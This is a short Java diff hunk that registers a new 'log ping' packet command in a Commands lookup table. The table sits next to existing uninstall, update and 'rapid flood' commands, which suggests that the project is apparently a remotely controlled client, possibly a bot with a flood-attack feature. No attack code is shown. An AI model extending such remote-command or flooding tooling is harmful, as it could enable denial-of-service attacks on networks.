@@ -26,6 +26,7 @@ public class Commands {
 		commands.put(Headers.PACKET_UNINSTALL, CommandUninstall.class);
 		commands.put(Headers.PACKET_UPDATE, CommandUpdate.class);
 		commands.put(Headers.PACKET_RAPID_FLOOD, CommandRapid.class);
+		commands.put(Headers.PACKET_LOG_PING, CommandLogPing.class);
 	}
 
 	/**
